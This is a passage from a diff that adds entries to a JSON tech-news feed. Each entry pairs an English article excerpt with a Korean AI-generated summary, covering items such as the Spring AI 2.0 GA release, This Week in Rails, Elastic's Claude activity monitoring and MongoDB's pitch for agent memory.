+    "aiSummary": "OpenAI가 새로운 Academy 교육 과정을 공개했습니다. 이번 과정은 사용자들이 실질적인 AI 활용 능력을 습득하고 반복 가능한 업무 흐름을 설계하며 일상적인 업무에 AI Agent를 효과적으로 적용할 수 있도록 지원하는 것을 목표로 합니다. 이를 통해 직무 현장에서 AI 기술을 생산적으로 활용할 수 있는 역량을 강화할 수 있습니다.",
+    "cleanContent": "OpenAI introduces three Academy courses that help people build practical AI skills, create repeatable workflows, and apply agents in everyday work.",
+    "url": "https://openai.com/index/academy-courses-applying-ai-at-work",
+    "category": "인공지능",
+    "source": "OpenAI News",
+    "author": "OpenAI News",
+    "pubDate": "Fri, 12 Jun 2026 10:00:00 GMT",
+    "fetchedAt": "2026-06-13T19:19:32.218Z",
+    "tags": [
+      "OpenAI",
+      "LLM",
+      "AI"
+    ]
+  },
+  {
+    "id": "https://laravel-news.com/toolkit-reusable-ai-tools-for-the-laravel-ai-sdk",
+    "title": "Toolkit: Reusable AI Tools for the Laravel AI SDK",
+    "summary": "Toolkit is a community catalog of small, independently installable tools for the Laravel AI SDK, covering math, read-only database queries, and web search, research providers, and more.\nThe post Toolk",
+    "aiSummary": "Toolkit은 Laravel AI SDK를 위한 커뮤니티 기반의 도구 카탈로그입니다. 수학 연산이나 읽기 전용 데이터베이스 쿼리, 웹 검색, 연구 제공자 등 다양한 기능을 수행하는 소규모의 독립적인 도구들을 설치하여 사용할 수 있습니다. 개발자는 이러한 재사용 가능한 도구들을 활용하여 자신의 프로젝트 내 AI 기능을 더욱 효율적으로 확장할 수 있습니다.",
+    "cleanContent": "Toolkit is a community catalog of small, independently installable tools for the Laravel AI SDK, covering math, read-only database queries, and web search, research providers, and more.\nThe post Toolkit: Reusable AI Tools for the Laravel AI SDK appeared first on Laravel News.\nJoin the Laravel Newsletter to get Laravel articles like this directly in your inbox.",
+    "url": "https://laravel-news.com/toolkit-reusable-ai-tools-for-the-laravel-ai-sdk?utm_medium=feed&utm_source=feedpress.me&utm_campaign=Feed%3A+laravelnews",
+    "category": "백엔드",
+    "source": "Laravel News",
+    "author": "Paul Redmond",
+    "pubDate": "Fri, 12 Jun 2026 01:37:13 +0000",
+    "fetchedAt": "2026-06-13T19:19:32.218Z",
+    "tags": [
+      "Laravel",
+      "PHP"
+    ]
+  },
+  {
+    "id": "https://spring.io/blog/2026/06/12/spring-ai-1-1-8-1-0-9-avaialble-now",
+    "title": "Spring AI 1.0.9, 1.1.8 Available Now",
+    "summary": "On behalf of the Spring AI engineering team and everyone who has contributed, I'm happy to announce that Spring AI 1.0.9, 1.1.8 have been released and are now available from Maven Central.\nThese relea",
+    "aiSummary": "Spring AI 1.0.9 및 1.1.8 버전이 Maven Central을 통해 공식 출시되었습니다. 이번 업데이트는 전반적인 안정성 향상과 버그 수정을 포함하며 CVE-2026-47835 보안 취약점 해결을 위한 패치가 포함되어 있습니다.\n\n두 버전 공통으로 Spring Boot 3.5.15 및 MCP SDK 0.18.3으로 의존성이 업그레이드되었습니다. 모델 관련 변경 사항으로는 Pixtral 모델이 지원 중단되었으며 ZhiPuAiApi와 관련된 버그 수정이 이루어졌습니다. 또한 Anthropic 채팅 서비스에 대한 속도 제한 메타데이터 문서가 추가되었습니다.\n\nSpring AI 팀은 곧 2.0.0 GA 버전을 출시할 예정이며 이에 대한 자세한 내용은 추후 별도의 블로그 게시물을 통해 공개할 계획입니다. 상세한 변경 이력은 각 버전별 릴리스 노트를 통해 확인할 수 있습니다.",
+    "cleanContent": "On behalf of the Spring AI engineering team and everyone who has contributed, I'm happy to announce that Spring AI 1.0.9, 1.1.8 have been released and are now available from Maven Central.\nThese releases deliver important improvements, stability enhancements, and bug fixes across multiple release streams.\nRelease Summary\nThese releases bring important updates, including dependency upgrades and bug fixes. See individual release notes: 1.0.9 | 1.1.8\nThe focus of these releases includes:\n\nDependency Upgrades: Upgrades to Spring Boot 3.5.15 and MCP SDK 0.18.3 across both versions.\nBug Fixes & Improvements: Fixes for ZhiPuAiApi and deprecation of Pixtral models.\nDocumentation: Added rate-limit metadata for Anthropic chat.\n\nIn addition, the releases contain security fix for CVE-2026-47835\nThanks to all those who have contributed with issue reports and pull requests.\nVersion-Specific Highlights\nSpring AI 1.0.9\nKey Highlights:\n\nModel Updates: Deprecated Pixtral models.\nDependency Upgrades: Upgraded Spring Boot to 3.5.15 and MCP SDK to 0.18.3.\n\nView complete release notes →\nSpring AI 1.1.8\nKey Highlights:\n\nBug Fixes: Added missing values to ZhiPuAiApi.ChatCompletionFinishReason.\nDocumentation: Added a rate-limit metadata section to anthropic-chat.adoc.\nDependency Upgrades: Upgraded Spring Boot to 3.5.15 and MCP SDK to 0.18.3.\n\nView complete release notes →\nWhat's Next\nSpring AI 2.0.0 is about to be released soon. Look forward to a separate blog on the release announcement on Spring AI 2.0 GA.\nResources\nProject Page | GitHub | Issues\nDocumentation: 1.0.9 Docs | 1.1.8 Docs",
+    "url": "https://spring.io/blog/2026/06/12/spring-ai-1-1-8-1-0-9-avaialble-now",
+    "category": "백엔드",
+    "source": "Spring Releases",
+    "author": "ilayaperumalg",
+    "pubDate": "Fri, 12 Jun 2026 00:00:00 GMT",
+    "fetchedAt": "2026-06-13T19:19:32.218Z",
+    "tags": [
+      "Spring",
+      "Java"
+    ]
+  },
+  {
+    "id": "https://spring.io/blog/2026/06/12/spring-ai-2-0-0-GA-available-now",
+    "title": "Spring AI 2.0.0 GA Available Now",
+    "summary": "On behalf of the team and everyone who has contributed, I'm happy to announce that Spring AI 2.0.0 has been released and is now available from Maven Central!\nRelease notes | Upgrade notes | Reference ",
+    "aiSummary": "Spring AI 2.0.0 GA 버전이 공식 출시되었습니다. 이번 업데이트는 Spring Boot 4와 Spring Framework 7을 기반으로 하며, 프로젝트의 일관성과 품질을 높이기 위한 구조적 개선에 집중했습니다. Jackson 3 도입으로 JSON 직렬화가 향상되었으며, JSpecify 어노테이션을 적용하여 Null-safety를 강화하고 Kotlin 친화적인 API를 제공합니다. 설정 옵션의 경우 불변성을 보장하는 빌더 패턴을 채택하여 일관성을 확보했습니다.\n\n지원되는 모델 공급자는 OpenAI, Anthropic, Amazon Bedrock, Google GenAI, Mistral AI, DeepSeek, Ollama 등으로 핵심 프로젝트 범위를 최적화했습니다. 특히 에이전트 시스템 구축을 위해 툴 실행 루프를 ChatClient의 어드바이저 체인으로 통합하여 확장성과 유연성을 높였습니다. 이를 통해 ToolSearchToolCallingAdvisor를 활용한 대규모 툴 관리와 StructuredOutputValidationAdvisor를 통한 구조화된 출력의 자동 보정이 가능해졌습니다.\n\nMCP 통합 기능은 더욱 강화되었습니다. 공식 MCP Java SDK 2.0.0을 포함하여 최신 MCP 사양을 준수하며, 어노테이션 기반 프로그래밍 모델을 통해 Spring 서비스를 MCP 서버로 손쉽게 노출할 수 있습니다. 또한 WebMVC와 WebFlux 전송 구현이 프레임워크로 통합되었고, Micrometer 및 OpenTelemetry를 활용한 엔터프라이즈급 관측 가능성과 보안 기능을 지원합니다. 커뮤니티 프로젝트를 통해 제공되는 이벤트 소싱 기반의 대화 메모리와 에이전트 유틸리티는 복잡한 AI 에이전트 개발을 지원합니다.",
+    "cleanContent": "On behalf of the team and everyone who has contributed, I'm happy to announce that Spring AI 2.0.0 has been released and is now available from Maven Central!\nRelease notes | Upgrade notes | Reference documentation | Javadoc\nImproved foundations\nSince the early days, Spring AI has grown very fast in terms of features, model support, contributions and users. That’s great and exciting, but we felt the need for setting a new baseline in terms of scope, quality and consistency in order to allow evolving the project in a sustainable way. So a few months ago, we took a step back and defined areas that we wanted to improve mostly in terms of design and consistency, also taking into account user feedback from issues and pull requests. Those new foundations that we release today will significantly improve the developer experience, allow higher quality contributions by the community and make it easier to integrate upcoming features we have already identified in our roadmap.\nSpring Boot 4 baseline\nSpring AI 2.0 has been designed to be used with Spring Boot 4.0 / 4.1 and Spring Framework 7.0, but it brings much more profound benefits than just upgrading the dependency versions and fixing compatibility issues.\nJackson 3\nJSON serialization was greatly improved by the upgrade from Jackson 2 to Jackson 3. The documentation now explains how to customize the default JsonMapper and introduces a new JsonHelper class for providing a fully customized JsonMapper.\nNull-safety\nFollowing the principles described in Null-safe applications with Spring Boot 4, Spring AI codebase is now fully annotated with JSpecify annotations. In addition to preventing null-pointer exceptions at runtime and providing a Kotlin idiomatic API, it allows clarification where values are optional or mandatory in the codebase.\nOptions\nWorking on null-safety also triggered a major refactoring of how options and configuration properties are handled:\n\nClarification of which options are mandatory or optional\nDefault values are now consistently defined at options level (not model or configuration properties)\nOptions are created with builders (not constructors) and are immutable once instantiated.\nThose builders now provide consistent and reflection-free merging capabilities\nDecoupling of options and configuration properties allowed the removal of the artificial .options segment in application property keys and fixing a lot of bugs\n\nLastly, we have clarified when options can be partially specified (typically with an option builder acting as a customizer for the ChatClient default options), and when they need to be fully specified (ChatModel level). More generally, you will see that Spring AI 2.0 embraces using ChatClient as the most common user-facing API while ChatModel is more of a lower-level building block. Read further for more exciting news about this.\nMore focus\nWe have chosen to focus the Spring AI core project on a well-defined set of chat model providers supported out-of-the-box:\n\nOpenAI\n\nwent from 3 variants (Azure, HTTP, SDK) to 1 (SDK)\ncan be used to access other models providing an OpenAI compatible API\n\n\nAnthropic\n\nwent from 2 variants (HTTP, SDK) to 1 (SDK)\ncan be used to access other models like Minimax providing an Anthropic compatible API\n\n\nAmazon Bedrock\nGoogle GenAI\n\nwent from 2 implementations (GenAI SDK, Vertex) to 1 (GenAI SDK)\n\n\nMistral AI\nDeepSeek\nOllama\n\nWe expect that leveraging vendor SDKs for OpenAI, Anthropic and Google will help Spring AI adapt to the latest model API extensions and new features.\nSome models are now maintained directly by the related vendors in collaboration with the Spring AI team:\n\nOCI Generative AI (kudos to Anders Swanson from Oracle)\nAzure Cosmos DB (kudos to Theo van Kraay from Microsoft)\n\nWe welcome support for additional models maintained externally. \nBetter collaboration with the community\nThe pace of contributions to Spring AI keeps increasing, we are super grateful to have such a vibrant community, but we also face challenges to be able to integrate those contributions. The improved consistency of Spring AI 2.0 codebase will help, but we also need to provide more guidance to our community in order to make those contributions more useful and integrated in a timely manner. Also as contributions involving coding agents are now the vast majority of the pull requests we receive, we think it is even more important in that context to have proper human review.\nFor this reason Spring AI now has a brand new CONTRIBUTING.md documentation, designed both for humans and agents, clarifying the rules and conventions for contributions. Please read it carefully if you plan to contribute.\nAgentic support improvements \nAgentic AI systems require a place to intercept and compose around the tool execution loop. In Spring AI 1.x that was challenging, as each chat model contained its own private tool-calling loop, buried inside the implementation with no way to hook into it, wrap it, or swap one execution strategy for another. You could call tools; you could not build on top of tool calling.\nSpring AI 2.0 lifts the tool loop into the advisor chain as a first-class, composable component. ChatClient runs every request through an ordered chain of advisors and supports looping, letting an advisor re-enter the downstream chain. The same mechanism drives tool-call loops, structured-output retry loops, and evaluation loops alike.\nUnified Tool Calling\nIn Spring AI 2.0, ToolCallingAdvisor is auto-registered by the ChatClient and implements the full tool-call round-trip. The ad-hoc tool loops previously implemented in each chat model are gone. When you need explicit control over each tool iteration, you can opt out and drive the loop manually.\nScaling to Hundreds of Tools\nToolSearchToolCallingAdvisor brings progressive tool disclosure to tool calling. Instead of registering every tool with every request, it exposes them incrementally on demand: the advisor indexes the full tool set once per session and lets the model retrieve relevant tools as needed.\nStructured Self-Correcting Output\nSpring AI has always offered portable, first-class structured output support, but even with native structured output enabled, a model can return non-conforming JSON. The auto-registerable StructuredOutputValidationAdvisor self-corrects on validation failures.\nSpring AI Community Extensions\n\nNew Event-Sourced Conversation Memory:\n\nThe spring-ai-session community project is an event-sourced replacement for the built-in ChatMemory. It supports all message types, including tool calls (safe inside the tool-call loop with any backend) and applies pluggable, turn-aware compaction strategies — including LLM-powered summarization — when the context window fills up.\n\nAgentic Patterns on Top of the Foundation:\n\nThe spring-ai-agent-utils community project builds on Spring AI 2.0's agentic foundation with production-ready primitives for building agentic systems, packaged as composable tools and advisors. It features Agent Skills, a portable, Spring AI-native implementation of the AgentSkills specification, as well as file, shell, web-fetch, task, auto-memory, and other useful utilities.\nMCP Integration \nModel Context Protocol (MCP) is emerging as the common protocol for AI integrations. \nThe Spring team builds and maintains the official MCP Java SDK, so Spring AI's MCP integration tracks the specification at the source. Spring AI 2.0 ships with MCP Java SDK 2.0.0, compliant with the latest 2025-11-25 MCP specification and consolidates the full MCP ecosystem under the Spring AI umbrella.\nAnnotation-Driven Programming Model\nThe mcp-annotations module (previously incubated in the community) is now part of Spring AI. The @McpTool, @McpResource, and @McpPrompt allow exposing any Spring service in an MCP server as a matter of one method annotation.\nA unified McpSyncRequestContext / McpAsyncRequestContext parameter, injected automatically into server handler methods, gives tools and resources a single entry point for logging, progress reporting, sampling, and elicitation.\nThe client side is a first-class citizen as well. Declarative handlers cover the full protocol callback model, with annotations for LLM sampling, elicitation, and capability-change notifications — enabling truly reactive agent clients.\nMCP Transports\nThe WebMVC and WebFlux transport implementations have been moved from the MCP Java SDK into Spring AI, aligning their release cadence with the rest of the framework. Streamable HTTP is now the default, replacing the deprecated SSE transport. Its stateless variant can be used to enable remote deployment scalability at the cost of MCP's bi-directionality communication. STDIO remains available for local process-based integrations.\nMCP Enterprise Features\nSpring AI's MCP integration inherits the full Spring production stack: Micrometer spans and OpenTelemetry-compatible metrics for server interaction and OAuth 2.0 and API-key security via the spring-ai-community/mcp-security project.\nConclusion\nSpring AI 2.0 has been made possible thanks to the amazing work of the Spring AI team and community. It provides a significantly improved developer experience for creating AI applications with Spring Boot 4, and opens the path to upcoming ambitious new features we will share in the upcoming months. We hope you will like it!\nTry it on start.spring.io or by upgrading your applications, and feel free to provide feedback on what you like, and what you hope in our future releases.\nCheers!",
+    "url": "https://spring.io/blog/2026/06/12/spring-ai-2-0-0-GA-available-now",
+    "category": "백엔드",
+    "source": "Spring Releases",
+    "author": "tzolov",
+    "pubDate": "Fri, 12 Jun 2026 00:00:00 GMT",
+    "fetchedAt": "2026-06-13T19:19:32.218Z",
+    "tags": [
+      "Spring",
+      "Java"
+    ]
+  },
+  {
+    "id": "https://rubyonrails.org/2026/6/12/this-week-in-rails",
+    "title": "This Week in Rails: June 12, 2026",
+    "summary": "Hi, it’s Greg, bringing you this week’s changes in the Rails codebase.\nFix increment! with explicit query constraints\nincrement! / decrement! on models with query\nconstraints to include every query co",
+    "aiSummary": "이번 주 Rails 코드베이스에는 데이터베이스 조작과 모델 관리의 안정성을 높이는 다수의 개선 사항이 포함되었습니다.\n\n먼저 increment!와 decrement! 메서드에서 쿼리 제약 조건을 명시적으로 반영하도록 수정하여 카운터 업데이트 시 모든 제약 컬럼이 포함되도록 개선하였습니다. 또한 복합 기본 키를 사용하는 모델에서 delete 메서드가 단일 ID를 정상적으로 처리할 수 있게 되었으며 find([]) 호출 시 빈 배열을 반환하도록 동작이 일관성 있게 통합되었습니다.\n\nRactor 안전성을 준비하기 위한 새로운 메커니즘이 도입되었습니다. 이를 통해 proc의 공유 가능 여부를 결정하는 :raise, :warn, nil 옵션을 설정하여 개발자가 Ractor::IsolationError를 제어할 수 있게 되었습니다. \n\n데이터베이스 작업과 관련하여 insert! 메서드에 :unique_by 옵션을 추가하였고 update_all 및 delete_all 메서드에서 group과 having 절이 무시되던 오류를 수정하여 정확한 데이터 범위에 작업이 수행되도록 변경하였습니다.\n\n그 외에도 vips 라이브러리가 설치되지 않은 환경에서도 rails new 명령어가 정상적으로 작동하도록 수정되었으며 Action Mailer의 _deliver 콜백에서 only와 except 옵션을 사용할 수 있게 되었습니다. 이번 업데이트는 총 39명의 기여자가 참여하였습니다.",
+    "cleanContent": "Hi, it’s Greg, bringing you this week’s changes in the Rails codebase.\nFix increment! with explicit query constraints\nincrement! / decrement! on models with query\nconstraints to include every query constraint column in the counter update.\n\nself.class.update_counters(id, attribute => change, touch: touch) \n\n\nSupport a single composite primary key id in delete\ndelete method with destroy and now they both accept a single ID of a composite primary key.\nReturn an empty array from find([]) on a composite primary key\nModel.find([]) returns [] for a model with a composite primary key, the same as it does with a single primary key.\nIntroduce a new mechanism for applications to prepare for ractor safety\n:raise -> Rails attempt to make the proc shareable. It it’s not, a loud Ractor::IsolationError will be raised.\n:warn -> We attempt to make the proc shareable. If it’s not, we rescue Ractor::IsolationError and output a warning.\nnil -> We do not attempt to make the proc shareable.\nAllow insert! to accept the :unique_by option\ninsert! now accepts the :unique_by option, consistent with insert.\nMake rails new work again on systems that do not have vips\nrails new was broken on Rails main if you do not have vips, but developers running rails new are not expected to have vips installed, especially if they are not using Active Storage. This change fixes the generator to work even when vips is not installed.\nFix update_all / delete_all ignoring group/having (updates/deletes every row)\nupdate_all / delete_all ignoring group and\nhaving, updating or deleting every row in the table instead of only the rows\nthat satisfy the HAVING clause.\nUpdated Active Job Basics guide\nSupport only: and except: on _deliver callbacks in Action Mailer\nconfig.action_mailer.raise_on_missing_callback_actions when using _deliver\ncallbacks with only: and except: options.\nYou can view the whole list of changes here.\nWe had 39 contributors to the Rails codebase this past week!\nUntil next time!\nSubscribe to get these updates mailed to you.",
+    "url": "https://rubyonrails.org/2026/6/12/this-week-in-rails",
+    "category": "백엔드",
+    "source": "Ruby on Rails",
+    "author": "Greg",
+    "pubDate": "2026-06-12T00:00:00.000Z",
+    "fetchedAt": "2026-06-13T19:19:32.218Z",
+    "tags": [
+      "Rails",
+      "Ruby"
+    ]
+  },
+  {
+    "id": "https://www.elastic.co/blog/monitor-claude-activity-in-elastic-security",
+    "title": "Monitor Claude activity in Elastic Security ",
+    "summary": "Elastic’s Anthropic integration ingests Claude Compliance API events into Elastic Security, enabling teams to monitor activity via dashboards, detect risks with automated rules, and investigate threat",
+    "aiSummary": "Elastic의 Anthropic 통합 기능은 Claude Compliance API 이벤트를 Elastic Security로 수집하는 역할을 수행합니다.\n\n보안 팀은 이를 통해 대시보드를 활용하여 Claude 사용 활동을 모니터링할 수 있습니다. 또한 자동화된 규칙을 설정하여 잠재적인 위험을 탐지하고, 기존에 수집된 원격 측정 데이터와 연계하여 통합적인 위협 조사를 수행할 수 있습니다.",
+    "cleanContent": "Elastic’s Anthropic integration ingests Claude Compliance API events into Elastic Security, enabling teams to monitor activity via dashboards, detect risks with automated rules, and investigate threats alongside existing telemetry.",
+    "url": "https://www.elastic.co/blog/monitor-claude-activity-in-elastic-security",
+    "category": "데이터베이스",
+    "source": "Elastic Blog",
+    "author": "Jamie Hynds,Sumana Mannem",
+    "pubDate": "Fri, 12 Jun 2026 00:00:00 GMT",
+    "fetchedAt": "2026-06-13T19:19:32.218Z",
+    "tags": [
+      "ElasticSearch",
+      "NoSQL"
+    ]
+  },
+  {
+    "id": "https://openai.com/index/preply",
+    "title": "How Preply combines AI and human tutors to personalize learning",
+    "summary": "Preply uses OpenAI to launch AI-generated lesson summaries, providing personalised feedback and language learning exercises.",
+    "aiSummary": "Preply는 OpenAI의 기술을 도입하여 AI가 생성하는 수업 요약 기능을 출시했습니다. 이 기능을 통해 학습자에게 개인화된 피드백을 제공하며 언어 학습을 돕는 맞춤형 연습 문제를 생성합니다. 이를 통해 기존의 인간 튜터 교육 방식에 AI의 효율성을 결합하여 학습 경험을 최적화하고자 합니다.",
+    "cleanContent": "Preply uses OpenAI to launch AI-generated lesson summaries, providing personalised feedback and language learning exercises.",
+    "url": "https://openai.com/index/preply",
+    "category": "인공지능",
+    "source": "OpenAI News",
+    "author": "OpenAI News",
+    "pubDate": "Fri, 12 Jun 2026 00:00:00 GMT",
+    "fetchedAt": "2026-06-13T19:19:32.218Z",
+    "tags": [
+      "OpenAI",
+      "LLM",
+      "AI"
+    ]
+  },
+  {
+    "id": "/blog/prisma-compute-custom-domains",
+    "title": "We Launched Prisma Compute with Custom Domains",
+    "summary": "Prisma Compute launched with custom domain support. Here's how we made the setup one DNS record while handling TLS certificate provisioning, storage, and routing behind the scenes.",
+    "aiSummary": "Prisma Compute가 커스텀 도메인 지원 기능을 새롭게 출시했습니다. 이번 업데이트를 통해 사용자는 단 하나의 DNS 레코드 설정만으로 복잡한 구성 없이 서비스를 이용할 수 있습니다.\n\n내부적으로는 TLS 인증서 프로비저닝과 데이터 스토리지 관리, 그리고 트래픽 라우팅 과정을 자동화하여 사용자 편의성을 크게 높였습니다. 이를 통해 개발자는 인프라 구성에 드는 시간을 줄이고 서비스 개발에 더욱 집중할 수 있게 되었습니다.",
+    "cleanContent": "Prisma Compute launched with custom domain support. Here's how we made the setup one DNS record while handling TLS certificate provisioning, storage, and routing behind the scenes.",
+    "url": "https://www.prisma.io/blog/prisma-compute-custom-domains",
+    "category": "백엔드",
+    "source": "Prisma Blog",
+    "author": "Prisma Blog",
+    "pubDate": "Fri, 12 Jun 2026 00:00:00 GMT",
+    "fetchedAt": "2026-06-14T10:33:56.852Z",
+    "tags": [
+      "Prisma",
+      "ORM",
+      "Database"
+    ]
+  },
+  {
+    "id": "https://github.blog/changelog/2026-06-11-github-enterprise-server-3-21-is-now-generally-available",
+    "title": "GitHub Enterprise Server 3.21 is now generally available",
+    "summary": "GitHub Enterprise Server (GHES) 3.21 enhances deployment efficiency, monitoring capabilities, code security, and policy management. Here are a few highlights in the 3.21 release: Organization custom p",
+    "aiSummary": "GitHub Enterprise Server 3.21 버전이 정식 출시되었습니다. 이번 업데이트는 배포 효율성 향상과 모니터링 기능 강화, 코드 보안 및 정책 관리 측면에서 개선된 성능을 제공합니다. 특히 Organization custom properties 기능이 정식으로 지원되는 등 기업용 관리 도구로서의 기능적 완성도가 높아졌습니다. 이번 릴리스를 통해 기업 사용자는 더욱 안정적이고 효율적인 개발 환경을 구축할 수 있습니다.",
+    "cleanContent": "GitHub Enterprise Server (GHES) 3.21 enhances deployment efficiency, monitoring capabilities, code security, and policy management. Here are a few highlights in the 3.21 release: Organization custom properties are now generally…\nThe post GitHub Enterprise Server 3.21 is now generally available appeared first on The GitHub Blog.",
+    "url": "https://github.blog/changelog/2026-06-11-github-enterprise-server-3-21-is-now-generally-available",
+    "category": "클라우드 & 인프라",
+    "source": "GitHub Changelog",
+    "author": "Allison",
+    "pubDate": "Thu, 11 Jun 2026 22:46:53 +0000",
+    "fetchedAt": "2026-06-14T10:33:56.852Z",
+    "tags": [
+      "GitHub",
+      "DevOps"
+    ]
+  },
+  {
+    "id": "https://www.mongodb.com/company/blog/innovation/production-ready-agents-need-production-ready-data-platform",
+    "title": "Production-Ready Agents Need A Production-Ready Data Platform",
+    "summary": "There’s a common theme to the conversations I’ve been having with AI teams lately: change. Constant, head-spinning change. Teams across industries are evaluating and re-evaluating model providers, age",
+    "aiSummary": "AI 기술이 급격히 발전함에 따라 많은 기업이 에이전트 프레임워크와 모델 공급자를 유연하게 변경할 수 있는 안정적인 데이터 플랫폼을 필요로 합니다. MongoDB는 이러한 변화에 대응하기 위해 자사의 MongoDB Atlas 플랫폼이 AI 에이전트 운영에 최적화된 솔루션임을 강조합니다.\n\nMongoDB는 AI 에이전트가 성공적으로 작동하기 위한 핵심 요소로 유연한 데이터 구조와 효율적인 문맥 관리를 꼽습니다. 데이터 저장 방식으로는 비정형 데이터와 메타데이터 처리에 유리한 JSON 형식을 채택하고 있으며, 운영 데이터 내에서 직접 검색, 벡터 검색, 하이브리드 검색 기능을 제공하여 별도의 시스템 간 데이터 동기화 없이도 실시간 고정밀 정보 검색을 지원합니다.\n\n실제 사례로 DevRev, ElevenLabs, Adobe 등의 기업이 MongoDB Atlas를 활용하여 AI 에이전트의 장기 기억 체계와 실시간 개인화 인터랙션을 구현하고 있습니다. 특히 ElevenLabs와 Adobe는 MongoDB의 검색 기능을 통해 복잡한 문맥을 유지하고 초저지연 성능을 확보함으로써 에이전트의 효율성을 높이고 있습니다.\n\n또한 MongoDB는 에이전트 메모리에 대한 개방형 표준을 마련하기 위해 LangChain 및 여러 파트너와 협력하고 있습니다. 이는 프레임워크 간 상호 운용성을 높여 기업들이 모델이나 프레임워크를 변경하더라도 메모리 구조를 재설계하는 비용을 최소화하기 위함입니다.\n\n결론적으로 MongoDB는 8.3 버전 업데이트를 통해 AI 워크로드의 속도와 수요를 충족시키며, 검색과 벡터 연산이 내장된 일원화된 데이터 플랫폼으로서 AI 에이전트의 확장성과 신뢰성을 보장합니다. 변화하는 환경에서 고정된 스키마에 얽매이지 않고 유연하게 대응할 수 있는 MongoDB의 데이터 모델은 향후 에이전트 기반 시스템 구축의 중요한 기반이 될 것입니다.",
+    "cleanContent": "There’s a common theme to the conversations I’ve been having with AI teams lately: change. Constant, head-spinning change. Teams across industries are evaluating and re-evaluating model providers, agent frameworks, and harnesses on a continuous basis.\nAt MongoDB, we believe that your choice of technology partner—specifically, your data platform—should simplify how you build with AI. It should deliver performance at scale, enable you to build and run anywhere, and it should allow you to choose your own providers and frameworks. This is exactly what MongoDB offers, and it’s why more than 67,000 customers rely on us for their most important applications.\nThe organizations seeing the most AI success are the ones whose technology stacks are set up for the current pace of change. For example, DevRev’s AgentOS platform is powered by MongoDB Atlas. AgentOS handles billions of requests each month, for everything from AI-assisted insights and analytics to internal communications and development. Relying on MongoDB Atlas has helped DevRev get innovations to market faster, and enables the company to scale seamlessly as it grows.\nMongoDB is ideal for agentic AI in two key ways.\nFirst, an agent is only as smart as its context—which requires blending short-term memory, long-term knowledge, and enterprise data. Because this information is highly dynamic and unstructured, JSON is the ideal format. It provides the schema flexibility inherently needed by the data and allows attaching metadata like IDs and confidence scores. MongoDB stores JSON natively and provides the scale and consistency required to run thousands of concurrent agents.\nSecond, it’s designed for how agents work. As memory accumulates, agents must pinpoint the precise context needed for a request. MongoDB solves this by providing state-of-the-art information retrieval capabilities (search, vector search, hybrid search, embeddings) directly where the operational data already lives, eliminating the need to constantly sync data across separate systems. Customers get high-precision semantic retrieval without the operational headache of managing multiple fragmented products.\nA good example of how MongoDB powers agents is ElevenLabs. The company relies on MongoDB Atlas to power the long-term memory and knowledge base for its autonomous agents. By leveraging Atlas Search and Vector Search, ElevenLabs enables their agents to retain complex context and deliver highly personalized interactions in real-time.\nAdobe, meanwhile, chose MongoDB as the long-term memory and reasoning layer for Journey Agent, its composite multimodal AI agent that unifies Adobe's marketing suite and orchestrates end-to-end customer journeys. Adobe leverages MongoDB Atlas Search and Atlas Vector Search together to power the sub-100 millisecond hybrid search the agent needs to act in real time.\nDefining an open standard for agent memory\nLast month, MongoDB partner LangChain announced the launch of Context Hub in LangSmith, a place to store, version, and collaborate on the files that define how agents behave, like AGENT.md and agent skills.\nBut context engineering goes beyond that. Agents also rely on memory: short-term context captured in states, sessions, and interaction history, and long-term memory that persists across sessions.\nFigure 1. Agent memory with MongoDB.\nProduction-Ready Agents blog image 1\nmedia\nToday, there is no broadly adopted open standard for defining and managing portable agent memory across agent frameworks. Now, MongoDB—alongside LangChain and ecosystem partners—is working on an open reference architecture and contributing toward greater interoperability in this space.\nThis work will help define what has been missing from the AI ecosystem: shared interfaces, metadata conventions, versioning patterns, and retrieval semantics for the data that differentiate agentic experiences and shape agent behavior.\nThe aim is to enable organizations to switch model providers or try a new framework on a Tuesday—and not lose Wednesday rewriting memory plumbing. Ultimately, we want to make agent memory and context easier (and faster) to manage.\nFor customer-facing agents to make real-time decisions, such as responding to a support request or making a policy change, they need contextual information instantly. Not info from a data warehouse that might be 30 minutes old. The context layer needs to be real-time, a required capability we’ve been delivering for tens of thousands of customers going on almost two decades.\nMongoDB’s performant, flexible platform = agentic success\nThe next generation of agents will increasingly be long-horizon systems, running for hours or more. As they take on more complex tasks, context will become even more critical, and agent memory will be central to making them effective.\nThis will create a demand for diverse, high-performance memory systems, and MongoDB is positioned to provide the flexibility and scalability agents require. With the recent release MongoDB 8.3, our core database has evolved to better support the speed and demands of AI workloads. MongoDB also delivers the retrieval accuracy necessary for agent outputs to be trusted (a non-negotiable for customer-facing applications) while optimizing tokens and cost in production.\nEvery AI team is currently making a bet about what the future of the agentic stack will look like. The ones betting on a flexible, production-ready data platform like MongoDB—that enables teams to innovate now while ensuring structure and resilience for the future—will be able to pivot quickly. The ones betting on rigid schema designs, or on a smattering of specific models and frameworks, might end up redoing their plumbing instead of shipping products.\nFigure 2. Advantages of MongoDB's flexible schema for AI workloads.\nProduction Ready Agents Blog - Image 2\nmedia\nMongoDB is built for AI: JSON is the lingua franca of AI. The information agents need is highly dynamic and can be structured, semi-structured, and unstructured. MongoDB provides the schema flexibility inherently needed by the data and allows attaching metadata for richer, more precise context. Dynamic, adaptive schemas that evolve in place as fast as thought without breaking what runs on top. The MongoDB document model isn’t adapted for AI; it’s the natural shape of AI data.\nMongoDB offers one data platform: Every data requirement for production AI is natively integrated. Search, vector search, embeddings, hybrid retrieval, time series, and streaming run on the same OLTP foundation 67,000+ customers trust with mission-critical applications—with one API, one security model, one operational footprint.",
+    "url": "https://www.mongodb.com/company/blog/innovation/production-ready-agents-need-production-ready-data-platform",
+    "category": "데이터베이스",
+    "source": "MongoDB Blog",
+    "author": "MongoDB Blog",
+    "pubDate": "Thu, 11 Jun 2026 19:46:11 GMT",
+    "fetchedAt": "2026-06-13T19:19:32.218Z",
+    "tags": [
+      "MongoDB",
+      "NoSQL"
+    ]
+  },
+  {
+    "id": "https://cloud.google.com/blog/products/identity-security/powering-the-next-era-of-confidential-ai/",
+    "title": "Powering the next era of Confidential AI",
+    "summary": "At Google Cloud, we’re committed to providing the most advanced, secure, and private infrastructure for the most demanding AI workloads, and partnering with a broad and diverse range of organizations ",
